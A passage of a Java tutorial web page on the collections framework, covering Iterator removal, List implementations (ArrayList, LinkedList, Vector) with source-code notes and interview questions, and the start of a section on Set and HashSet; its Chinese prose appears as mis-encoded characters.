å†è°ƒç”¨removeéƒ½ä¼šæŠ¥IllegalStateExceptionã€‚</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line"><span class="comment">//            iterator.remove();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;Tom&quot;</span>.equals(obj))&#123;</span><br><span class="line">                iterator.remove();</span><br><span class="line"><span class="comment">//                iterator.remove();                </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éå†é›†åˆ</span></span><br><span class="line">        iterator = coll.iterator();</span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ³¨æ„ï¼š<ul>
<li>Iteratorå¯ä»¥åˆ é™¤é›†åˆçš„å…ƒç´ ï¼Œä½†æ˜¯æ˜¯éå†è¿‡ç¨‹ä¸­é€šè¿‡è¿­ä»£å™¨å¯¹è±¡çš„removeæ–¹æ³•ï¼Œä¸æ˜¯é›†åˆå¯¹è±¡çš„removeæ–¹æ³•ã€‚</li>
<li><strong>å¦‚æœè¿˜æœªè°ƒç”¨next()æˆ–åœ¨ä¸Šä¸€æ¬¡è°ƒç”¨nextæ–¹æ³•ä¹‹åå·²ç»è°ƒç”¨äº†removeæ–¹æ³•ï¼Œå†è°ƒç”¨removeéƒ½ä¼šæŠ¥IllegalStateException</strong>ã€‚</li>
</ul>
</li>
</ul>
<h4 id="æ–°ç‰¹æ€§foreachå¾ªç¯éå†é›†åˆæˆ–æ•°ç»„"><a href="#æ–°ç‰¹æ€§foreachå¾ªç¯éå†é›†åˆæˆ–æ•°ç»„" class="headerlink" title="æ–°ç‰¹æ€§foreachå¾ªç¯éå†é›†åˆæˆ–æ•°ç»„"></a>æ–°ç‰¹æ€§foreachå¾ªç¯éå†é›†åˆæˆ–æ•°ç»„</h4><ul>
<li>Java 5.0 æä¾›äº†foreachå¾ªç¯è¿­ä»£è®¿é—®Collectionå’Œæ•°ç»„ã€‚</li>
<li>éå†æ“ä½œä¸éœ€è·å–Collectionæˆ–æ•°ç»„çš„é•¿åº¦ï¼Œæ— éœ€ä½¿ç”¨ç´¢å¼•è®¿é—®å…ƒç´ ã€‚</li>
<li><strong>éå†é›†åˆçš„åº•å±‚è°ƒç”¨Iteratorå®Œæˆæ“ä½œã€‚</strong></li>
<li>foreachè¿˜å¯ä»¥ç”¨æ¥éå†æ•°ç»„ã€‚</li>
</ul>
<h3 id="4ã€Collectionå­æ¥å£ä¹‹ä¸€ï¼šListæ¥å£"><a href="#4ã€Collectionå­æ¥å£ä¹‹ä¸€ï¼šListæ¥å£" class="headerlink" title="4ã€Collectionå­æ¥å£ä¹‹ä¸€ï¼šListæ¥å£"></a>4ã€Collectionå­æ¥å£ä¹‹ä¸€ï¼šListæ¥å£</h3><h3 id="4-Collectionå­æ¥å£ä¹‹ä¸€ï¼šListæ¥å£"><a href="#4-Collectionå­æ¥å£ä¹‹ä¸€ï¼šListæ¥å£" class="headerlink" title="4.Collectionå­æ¥å£ä¹‹ä¸€ï¼šListæ¥å£"></a>4.Collectionå­æ¥å£ä¹‹ä¸€ï¼šListæ¥å£</h3><ul>
<li>é‰´äºJavaä¸­æ•°ç»„ç”¨æ¥å­˜å‚¨æ•°æ®çš„å±€é™æ€§ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨Listæ›¿ä»£æ•°ç»„</li>
<li>Listé›†åˆç±»ä¸­å…ƒç´ æœ‰åºã€ä¸”å¯é‡å¤ï¼Œé›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æœ‰å…¶å¯¹åº”çš„é¡ºåºç´¢å¼•ã€‚</li>
<li>Listå®¹å™¨ä¸­çš„å…ƒç´ éƒ½å¯¹åº”ä¸€ä¸ªæ•´æ•°å‹çš„åºå·è®°è½½å…¶åœ¨å®¹å™¨ä¸­çš„ä½ç½®ï¼Œå¯ä»¥æ ¹æ®åºå·å­˜å–å®¹å™¨ä¸­çš„å…ƒç´ ã€‚</li>
<li>JDK APIä¸­Listæ¥å£çš„å®ç°ç±»å¸¸ç”¨çš„æœ‰ï¼šArrayListã€LinkedListå’ŒVectorã€‚</li>
</ul>
<h4 id="Listæ¥å£å¸¸ç”¨å®ç°ç±»çš„å¯¹æ¯”"><a href="#Listæ¥å£å¸¸ç”¨å®ç°ç±»çš„å¯¹æ¯”" class="headerlink" title="Listæ¥å£å¸¸ç”¨å®ç°ç±»çš„å¯¹æ¯”"></a>Listæ¥å£å¸¸ç”¨å®ç°ç±»çš„å¯¹æ¯”</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Listæ¥å£æ¡†æ¶</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    |----Collectionæ¥å£ï¼šå•åˆ—é›†åˆï¼Œç”¨æ¥å­˜å‚¨ä¸€ä¸ªä¸€ä¸ªçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *          |----Listæ¥å£ï¼šå­˜å‚¨æœ‰åºçš„ã€å¯é‡å¤çš„æ•°æ®ã€‚  --&gt;â€œåŠ¨æ€â€æ•°ç»„,æ›¿æ¢åŸæœ‰çš„æ•°ç»„</span></span><br><span class="line"><span class="comment"> *              |----ArrayListï¼šä½œä¸ºListæ¥å£çš„ä¸»è¦å®ç°ç±»ï¼›çº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œæ•ˆç‡é«˜ï¼›åº•å±‚ä½¿ç”¨Object[] elementDataå­˜å‚¨</span></span><br><span class="line"><span class="comment"> *              |----LinkedListï¼šå¯¹äºé¢‘ç¹çš„æ’å…¥ã€åˆ é™¤æ“ä½œï¼Œä½¿ç”¨æ­¤ç±»æ•ˆç‡æ¯”ArrayListé«˜ï¼›åº•å±‚ä½¿ç”¨åŒå‘é“¾è¡¨å­˜å‚¨</span></span><br><span class="line"><span class="comment"> *              |----Vectorï¼šä½œä¸ºListæ¥å£çš„å¤è€å®ç°ç±»ï¼›çº¿ç¨‹å®‰å…¨çš„ï¼Œæ•ˆç‡ä½ï¼›åº•å±‚ä½¿ç”¨Object[] elementDataå­˜å‚¨</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * é¢è¯•é¢˜ï¼šæ¯”è¾ƒArrayListã€LinkedListã€Vectorä¸‰è€…çš„å¼‚åŒï¼Ÿ</span></span><br><span class="line"><span class="comment"> *        åŒï¼šä¸‰ä¸ªç±»éƒ½æ˜¯å®ç°äº†Listæ¥å£ï¼Œå­˜å‚¨æ•°æ®çš„ç‰¹ç‚¹ç›¸åŒï¼šå­˜å‚¨æœ‰åºçš„ã€å¯é‡å¤çš„æ•°æ®</span></span><br><span class="line"><span class="comment"> *        ä¸åŒï¼šè§ä¸Š</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="ArrayListçš„æºç åˆ†æ"><a href="#ArrayListçš„æºç åˆ†æ" class="headerlink" title="ArrayListçš„æºç åˆ†æ"></a>ArrayListçš„æºç åˆ†æ</h4><ul>
<li>ArrayListæ˜¯List æ¥å£çš„å…¸å‹å®ç°ç±»ã€ä¸»è¦å®ç°ç±»</li>
<li>æœ¬è´¨ä¸Šï¼ŒArrayListæ˜¯å¯¹è±¡å¼•ç”¨çš„ä¸€ä¸ªâ€å˜é•¿â€æ•°ç»„</li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 2.ArrayListçš„æºç åˆ†æï¼š</span></span><br><span class="line"><span class="comment"> *   2.1 jdk 7æƒ…å†µä¸‹</span></span><br><span class="line"><span class="comment"> *      ArrayList list = new ArrayList();//åº•å±‚åˆ›å»ºäº†é•¿åº¦æ˜¯10çš„Object[]æ•°ç»„elementData</span></span><br><span class="line"><span class="comment"> *      list.add(123);//elementData[0] = new Integer(123);</span></span><br><span class="line"><span class="comment"> *      ...</span></span><br><span class="line"><span class="comment"> *      list.add(11);//å¦‚æœæ­¤æ¬¡çš„æ·»åŠ å¯¼è‡´åº•å±‚elementDataæ•°ç»„å®¹é‡ä¸å¤Ÿï¼Œåˆ™æ‰©å®¹ã€‚</span></span><br><span class="line"><span class="comment"> *      é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰©å®¹ä¸ºåŸæ¥çš„å®¹é‡çš„1.5å€ï¼ŒåŒæ—¶éœ€è¦å°†åŸæœ‰æ•°ç»„ä¸­çš„æ•°æ®å¤åˆ¶åˆ°æ–°çš„æ•°ç»„ä¸­ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      ç»“è®ºï¼šå»ºè®®å¼€å‘ä¸­ä½¿ç”¨å¸¦å‚çš„æ„é€ å™¨ï¼šArrayList list = new ArrayList(int capacity)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   2.2 jdk 8ä¸­ArrayListçš„å˜åŒ–ï¼š</span></span><br><span class="line"><span class="comment"> *      ArrayList list = new ArrayList();//åº•å±‚Object[] elementDataåˆå§‹åŒ–ä¸º&#123;&#125;.å¹¶æ²¡æœ‰åˆ›å»ºé•¿åº¦ä¸º10çš„æ•°ç»„</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      list.add(123);//ç¬¬ä¸€æ¬¡è°ƒç”¨add()æ—¶ï¼Œåº•å±‚æ‰åˆ›å»ºäº†é•¿åº¦10çš„æ•°ç»„ï¼Œå¹¶å°†æ•°æ®123æ·»åŠ åˆ°elementData[0]</span></span><br><span class="line"><span class="comment"> *      ...</span></span><br><span class="line"><span class="comment"> *      åç»­çš„æ·»åŠ å’Œæ‰©å®¹æ“ä½œä¸jdk 7 æ— å¼‚ã€‚</span></span><br><span class="line"><span class="comment"> *   2.3 å°ç»“ï¼šjdk7ä¸­çš„ArrayListçš„å¯¹è±¡çš„åˆ›å»ºç±»ä¼¼äºå•ä¾‹çš„é¥¿æ±‰å¼ï¼Œè€Œjdk8ä¸­çš„ArrayListçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *            çš„åˆ›å»ºç±»ä¼¼äºå•ä¾‹çš„æ‡’æ±‰å¼ï¼Œå»¶è¿Ÿäº†æ•°ç»„çš„åˆ›å»ºï¼ŒèŠ‚çœå†…å­˜ã€‚</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="LinkedListçš„æºç åˆ†æ"><a href="#LinkedListçš„æºç åˆ†æ" class="headerlink" title="LinkedListçš„æºç åˆ†æ"></a>LinkedListçš„æºç åˆ†æ</h4><ul>
<li><p>å¯¹äºé¢‘ç¹çš„æ’å…¥æˆ–åˆ é™¤å…ƒç´ çš„æ“ä½œï¼Œå»ºè®®ä½¿ç”¨LinkedListç±»ï¼Œæ•ˆç‡è¾ƒé«˜</p>
</li>
<li><p>LinkedListï¼šåŒå‘é“¾è¡¨ï¼Œå†…éƒ¨æ²¡æœ‰å£°æ˜æ•°ç»„ï¼Œè€Œæ˜¯å®šä¹‰äº†Nodeç±»å‹çš„firstå’Œlastï¼Œç”¨äºè®°å½•é¦–æœ«å…ƒç´ ã€‚åŒæ—¶ï¼Œå®šä¹‰å†…éƒ¨ç±»Nodeï¼Œä½œä¸ºLinkedListä¸­ä¿å­˜æ•°æ®çš„åŸºæœ¬ç»“æ„ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/d310da4fde968e21e9c4cd5fb731e3e1--e5c3--image-20240926114757184.png" alt="image-20240926114757184"></p>
</li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 3.LinkedListçš„æºç åˆ†æï¼š</span></span><br><span class="line"><span class="comment">  *       LinkedList list = new LinkedList(); å†…éƒ¨å£°æ˜äº†Nodeç±»å‹çš„firstå’Œlastå±æ€§ï¼Œé»˜è®¤å€¼ä¸ºnull</span></span><br><span class="line"><span class="comment">  *       list.add(123);//å°†123å°è£…åˆ°Nodeä¸­ï¼Œåˆ›å»ºäº†Nodeå¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  *       å…¶ä¸­ï¼ŒNodeå®šä¹‰ä¸ºï¼šä½“ç°äº†LinkedListçš„åŒå‘é“¾è¡¨çš„è¯´æ³•</span></span><br><span class="line"><span class="comment">  *       private static class Node&lt;E&gt; &#123;</span></span><br><span class="line"><span class="comment">  *            E item;</span></span><br><span class="line"><span class="comment">  *            Node&lt;E&gt; next;</span></span><br><span class="line"><span class="comment">  *            Node&lt;E&gt; prev;</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  *            Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span></span><br><span class="line"><span class="comment">  *            this.item = element;</span></span><br><span class="line"><span class="comment">  *            this.next = next;     //nextå˜é‡è®°å½•ä¸‹ä¸€ä¸ªå…ƒç´ çš„ä½ç½®</span></span><br><span class="line"><span class="comment">  *            this.prev = prev;     //prevå˜é‡è®°å½•å‰ä¸€ä¸ªå…ƒç´ çš„ä½ç½®</span></span><br><span class="line"><span class="comment">  *            &#125;</span></span><br><span class="line"><span class="comment">  *        &#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="Vectorçš„æºç åˆ†æ"><a href="#Vectorçš„æºç åˆ†æ" class="headerlink" title="Vectorçš„æºç åˆ†æ"></a>Vectorçš„æºç åˆ†æ</h4><ul>
<li>Vector æ˜¯ä¸€ä¸ªå¤è€çš„é›†åˆï¼ŒJDK1.0å°±æœ‰äº†ã€‚å¤§å¤šæ•°æ“ä½œä¸ArrayListç›¸åŒï¼ŒåŒºåˆ«ä¹‹å¤„åœ¨äºVectoræ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</li>
<li>åœ¨å„ç§listä¸­ï¼Œæœ€å¥½æŠŠArrayListä½œä¸ºç¼ºçœé€‰æ‹©ã€‚å½“æ’å…¥ã€åˆ é™¤é¢‘ç¹æ—¶ï¼Œä½¿ç”¨LinkedListï¼›Vectoræ€»æ˜¯æ¯”ArrayListæ…¢ï¼Œæ‰€ä»¥å°½é‡é¿å…ä½¿ç”¨ã€‚</li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">  * 4.Vectorçš„æºç åˆ†æï¼šjdk7å’Œjdk8ä¸­é€šè¿‡Vector()æ„é€ å™¨åˆ›å»ºå¯¹è±¡æ—¶ï¼Œåº•å±‚éƒ½åˆ›å»ºäº†é•¿åº¦ä¸º10çš„æ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment">  *      åœ¨æ‰©å®¹æ–¹é¢ï¼Œé»˜è®¤æ‰©å®¹ä¸ºåŸæ¥çš„æ•°ç»„é•¿åº¦çš„2å€ã€‚</span></span><br><span class="line"><span class="comment">  */</span>    </span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="Listæ¥å£ä¸­çš„å¸¸ç”¨æ–¹æ³•æµ‹è¯•"><a href="#Listæ¥å£ä¸­çš„å¸¸ç”¨æ–¹æ³•æµ‹è¯•" class="headerlink" title="Listæ¥å£ä¸­çš„å¸¸ç”¨æ–¹æ³•æµ‹è¯•"></a>Listæ¥å£ä¸­çš„å¸¸ç”¨æ–¹æ³•æµ‹è¯•</h4><ul>
<li>Listé™¤äº†ä»Collectioné›†åˆç»§æ‰¿çš„æ–¹æ³•å¤–ï¼ŒList é›†åˆé‡Œæ·»åŠ äº†ä¸€äº›æ ¹æ®ç´¢å¼•æ¥æ“ä½œé›†åˆå…ƒç´ çš„æ–¹æ³•ã€‚<ul>
<li>void add(intindex, Object ele):åœ¨indexä½ç½®æ’å…¥eleå…ƒç´ </li>
<li>boolean addAll(int index, Collection eles):ä»indexä½ç½®å¼€å§‹å°†elesä¸­çš„æ‰€æœ‰å…ƒç´ æ·»åŠ è¿›æ¥</li>
<li>Object get(int index):è·å–æŒ‡å®šindexä½ç½®çš„å…ƒç´ </li>
<li>int indexOf(Object obj):è¿”å›objåœ¨é›†åˆä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</li>
<li>int lastIndexOf(Object obj):è¿”å›objåœ¨å½“å‰é›†åˆä¸­æœ«æ¬¡å‡ºç°çš„ä½ç½®</li>
<li>Object remove(int index):ç§»é™¤æŒ‡å®šindexä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›æ­¤å…ƒç´ </li>
<li>Object set(int index, Object ele):è®¾ç½®æŒ‡å®šindexä½ç½®çš„å…ƒç´ ä¸ºele</li>
<li>List subList(int fromIndex, int toIndex):è¿”å›ä»fromIndexåˆ°toIndexä½ç½®çš„å­é›†åˆ</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 5.Listæ¥å£çš„å¸¸ç”¨æ–¹æ³•</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * void add(int index, Object ele):åœ¨indexä½ç½®æ’å…¥eleå…ƒç´ </span></span><br><span class="line"><span class="comment">     * boolean addAll(int index, Collection eles):ä»indexä½ç½®å¼€å§‹å°†elesä¸­çš„æ‰€æœ‰å…ƒç´ æ·»åŠ è¿›æ¥</span></span><br><span class="line"><span class="comment">     * Object get(int index):è·å–æŒ‡å®šindexä½ç½®çš„å…ƒç´ </span></span><br><span class="line"><span class="comment">     * int indexOf(Object obj):è¿”å›objåœ¨é›†åˆä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span></span><br><span class="line"><span class="comment">     * int lastIndexOf(Object obj):è¿”å›objåœ¨å½“å‰é›†åˆä¸­æœ«æ¬¡å‡ºç°çš„ä½ç½®</span></span><br><span class="line"><span class="comment">     * Object remove(int index):ç§»é™¤æŒ‡å®šindexä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›æ­¤å…ƒç´ </span></span><br><span class="line"><span class="comment">     * Object set(int index, Object ele):è®¾ç½®æŒ‡å®šindexä½ç½®çš„å…ƒç´ ä¸ºele</span></span><br><span class="line"><span class="comment">     * List subList(int fromIndex, int toIndex):è¿”å›ä»fromIndexåˆ°toIndexä½ç½®çš„å­é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * æ€»ç»“ï¼šå¸¸ç”¨æ–¹æ³•</span></span><br><span class="line"><span class="comment">     * å¢ï¼šadd(Object obj)</span></span><br><span class="line"><span class="comment">     * åˆ ï¼šremove(int index) / remove(Object obj)</span></span><br><span class="line"><span class="comment">     * æ”¹ï¼šset(int index, Object ele)</span></span><br><span class="line"><span class="comment">     * æŸ¥ï¼šget(int index)</span></span><br><span class="line"><span class="comment">     * æ’ï¼šadd(int index, Object ele)</span></span><br><span class="line"><span class="comment">     * é•¿åº¦ï¼šsize()</span></span><br><span class="line"><span class="comment">     * éå†ï¼šâ‘  Iteratorè¿­ä»£å™¨æ–¹å¼</span></span><br><span class="line"><span class="comment">     *      â‘¡ å¢å¼ºforå¾ªç¯</span></span><br><span class="line"><span class="comment">     *      â‘¢ æ™®é€šçš„å¾ªç¯</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h4 id="Listçš„ä¸€ä¸ªé¢è¯•é¢˜"><a href="#Listçš„ä¸€ä¸ªé¢è¯•é¢˜" class="headerlink" title="Listçš„ä¸€ä¸ªé¢è¯•é¢˜"></a>Listçš„ä¸€ä¸ªé¢è¯•é¢˜</h4><ul>
<li>é¢è¯•é¢˜1</li>
</ul>
<blockquote>
<p>è¯·é—®ArrayList&#x2F;LinkedList&#x2F;Vectorçš„å¼‚åŒï¼Ÿè°ˆè°ˆä½ çš„ç†è§£ï¼ŸArrayListåº•å±‚æ˜¯ä»€ä¹ˆï¼Ÿæ‰©å®¹æœºåˆ¶ï¼ŸVectorå’ŒArrayListçš„æœ€å¤§åŒºåˆ«?</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * è¯·é—®ArrayList/LinkedList/Vectorçš„å¼‚åŒï¼Ÿè°ˆè°ˆä½ çš„ç†è§£ï¼Ÿ</span></span><br><span class="line"><span class="comment">  * ArrayListåº•å±‚æ˜¯ä»€ä¹ˆï¼Ÿæ‰©å®¹æœºåˆ¶ï¼ŸVectorå’ŒArrayListçš„æœ€å¤§åŒºåˆ«?</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * ArrayListå’ŒLinkedListçš„å¼‚åŒäºŒè€…éƒ½çº¿ç¨‹ä¸å®‰å…¨ï¼Œç›¸å¯¹çº¿ç¨‹å®‰å…¨çš„Vectorï¼Œæ‰§è¡Œæ•ˆç‡é«˜ã€‚</span></span><br><span class="line"><span class="comment">  * æ­¤å¤–ï¼ŒArrayListæ˜¯å®ç°äº†åŸºäºåŠ¨æ€æ•°ç»„çš„æ•°æ®ç»“æ„ï¼ŒLinkedListåŸºäºé“¾è¡¨çš„æ•°æ®ç»“æ„ã€‚</span></span><br><span class="line"><span class="comment">  * å¯¹äºéšæœºè®¿é—®getå’Œsetï¼ŒArrayListè§‰å¾—ä¼˜äºLinkedListï¼Œå› ä¸ºLinkedListè¦ç§»åŠ¨æŒ‡é’ˆã€‚</span></span><br><span class="line"><span class="comment">  * å¯¹äºæ–°å¢å’Œåˆ é™¤æ“ä½œadd(ç‰¹æŒ‡æ’å…¥)å’Œremoveï¼ŒLinkedListæ¯”è¾ƒå ä¼˜åŠ¿ï¼Œå› ä¸ºArrayListè¦ç§»åŠ¨æ•°æ®ã€‚</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * ArrayListå’ŒVectorçš„åŒºåˆ«Vectorå’ŒArrayListå‡ ä¹æ˜¯å®Œå…¨ç›¸åŒçš„,</span></span><br><span class="line"><span class="comment">  * å”¯ä¸€çš„åŒºåˆ«åœ¨äºVectoræ˜¯åŒæ­¥ç±»(synchronized)ï¼Œå±äºå¼ºåŒæ­¥ç±»ã€‚</span></span><br><span class="line"><span class="comment">  * å› æ­¤å¼€é”€å°±æ¯”ArrayListè¦å¤§ï¼Œè®¿é—®è¦æ…¢ã€‚æ­£å¸¸æƒ…å†µä¸‹,</span></span><br><span class="line"><span class="comment">  * å¤§å¤šæ•°çš„Javaç¨‹åºå‘˜ä½¿ç”¨ArrayListè€Œä¸æ˜¯Vector,</span></span><br><span class="line"><span class="comment">  * å› ä¸ºåŒæ­¥å®Œå…¨å¯ä»¥ç”±ç¨‹åºå‘˜è‡ªå·±æ¥æ§åˆ¶ã€‚Vectoræ¯æ¬¡æ‰©å®¹è¯·æ±‚å…¶å¤§å°çš„2å€ç©ºé—´ï¼Œ</span></span><br><span class="line"><span class="comment">  * è€ŒArrayListæ˜¯1.5å€ã€‚Vectorè¿˜æœ‰ä¸€ä¸ªå­ç±»Stackã€‚</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<h3 id="5ã€Collectionå­æ¥å£ä¹‹äºŒï¼šSetæ¥å£"><a href="#5ã€Collectionå­æ¥å£ä¹‹äºŒï¼šSetæ¥å£" class="headerlink" title="5ã€Collectionå­æ¥å£ä¹‹äºŒï¼šSetæ¥å£"></a>5ã€Collectionå­æ¥å£ä¹‹äºŒï¼šSetæ¥å£</h3><ul>
<li>Setæ¥å£æ˜¯Collectionçš„å­æ¥å£ï¼Œsetæ¥å£æ²¡æœ‰æä¾›é¢å¤–çš„æ–¹æ³•</li>
<li>Set é›†åˆä¸å…è®¸åŒ…å«ç›¸åŒçš„å…ƒç´ ï¼Œå¦‚æœè¯•æŠŠä¸¤ä¸ªç›¸åŒçš„å…ƒç´ åŠ å…¥åŒä¸€ä¸ªSet é›†åˆä¸­ï¼Œåˆ™æ·»åŠ æ“ä½œå¤±è´¥ã€‚</li>
<li>Set åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸åŒä¸æ˜¯ä½¿ç”¨&#x3D;&#x3D; è¿ç®—ç¬¦ï¼Œè€Œæ˜¯æ ¹æ®equals() æ–¹æ³•</li>
</ul>
<h4 id="Setæ¥å£å®ç°ç±»çš„å¯¹æ¯”"><a href="#Setæ¥å£å®ç°ç±»çš„å¯¹æ¯”" class="headerlink" title="Setæ¥å£å®ç°ç±»çš„å¯¹æ¯”"></a>Setæ¥å£å®ç°ç±»çš„å¯¹æ¯”</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.Setæ¥å£çš„æ¡†æ¶ï¼š</span></span><br><span class="line"><span class="comment"> * |----Collectionæ¥å£ï¼šå•åˆ—é›†åˆï¼Œç”¨æ¥å­˜å‚¨ä¸€ä¸ªä¸€ä¸ªçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *          |----Setæ¥å£ï¼šå­˜å‚¨æ— åºçš„ã€ä¸å¯é‡å¤çš„æ•°æ®   --&gt;é«˜ä¸­è®²çš„â€œé›†åˆâ€</span></span><br><span class="line"><span class="comment"> *             |----HashSetï¼šä½œä¸ºSetæ¥å£çš„ä¸»è¦å®ç°ç±»ï¼›çº¿ç¨‹ä¸å®‰å…¨çš„ï¼›å¯ä»¥å­˜å‚¨nullå€¼</span></span><br><span class="line"><span class="comment"> *                 |----LinkedHashSetï¼šä½œä¸ºHashSetçš„å­ç±»ï¼›éå†å…¶å†…éƒ¨æ•°æ®æ—¶ï¼Œå¯ä»¥æŒ‰ç…§æ·»åŠ çš„é¡ºåºéå†</span></span><br><span class="line"><span class="comment"> *                                    å¯¹äºé¢‘ç¹çš„éå†æ“ä½œï¼ŒLinkedHashSetæ•ˆç‡é«˜äºHashSet.</span></span><br><span class="line"><span class="comment"> *             |----TreeSetï¼šå¯ä»¥æŒ‰ç…§æ·»åŠ å¯¹è±¡çš„æŒ‡å®šå±æ€§ï¼Œè¿›è¡Œæ’åºã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="HashSetä¸­å…ƒç´ çš„æ·»åŠ è¿‡ç¨‹"><a href="#HashSetä¸­å…ƒç´ çš„æ·»åŠ è¿‡ç¨‹" class="headerlink" title="HashSetä¸­å…ƒç´ çš„æ·»åŠ è¿‡ç¨‹"></a>HashSetä¸­å…ƒç´ çš„æ·»åŠ è¿‡ç¨‹</h4><ul>
<li><p>HashSetæ˜¯Set æ¥å£çš„å…¸å‹å®ç°ï¼Œå¤§å¤šæ•°æ—¶å€™ä½¿ç”¨Set é›†åˆæ—¶éƒ½ä½¿ç”¨è¿™ä¸ªå®ç°ç±»ã€‚</p>
</li>
<li><p>HashSetæŒ‰Hash ç®—æ³•æ¥å­˜å‚¨é›†åˆä¸­çš„å…ƒç´ ï¼Œå› æ­¤å…·æœ‰å¾ˆå¥½çš„å­˜å–ã€æŸ¥æ‰¾ã€åˆ é™¤æ€§èƒ½ã€‚</p>
</li>
<li><p>HashSetå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼šä¸èƒ½ä¿è¯å…ƒç´ çš„æ’åˆ—é¡ºåº</p>
<ul>
<li>HashSetä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„</li>
<li>é›†åˆå…ƒç´ å¯ä»¥æ˜¯null</li>
</ul>
</li>
<li><p>HashSet é›†åˆåˆ¤æ–­ä¸¤ä¸ªå…ƒç´ ç›¸ç­‰çš„æ ‡å‡†ï¼šä¸¤ä¸ªå¯¹è±¡é€šè¿‡hashCode() æ–¹æ³•æ¯”è¾ƒç›¸ç­‰ï¼Œå¹¶ä¸”ä¸¤ä¸ªå¯¹è±¡çš„equals() æ–¹æ³•è¿”å›å€¼ä¹Ÿç›¸ç­‰ã€‚</p>
</li>
<li><p>å¯¹äºå­˜æ”¾åœ¨Setå®¹å™¨ä¸­çš„å¯¹è±¡ï¼Œå¯¹åº”çš„ç±»ä¸€å®šè¦é‡å†™equals()å’ŒhashCode(Object obj)æ–¹æ³•ï¼Œä»¥å®ç°å¯¹è±¡ç›¸ç­‰è§„åˆ™ã€‚å³ï¼šâ€œ<strong>ç›¸ç­‰çš„å¯¹è±¡å¿…é¡»å…·æœ‰ç›¸ç­‰çš„æ•£åˆ—ç </strong>â€ã€‚</p>
</li>
<li></li>
</ul>
<blockquote>
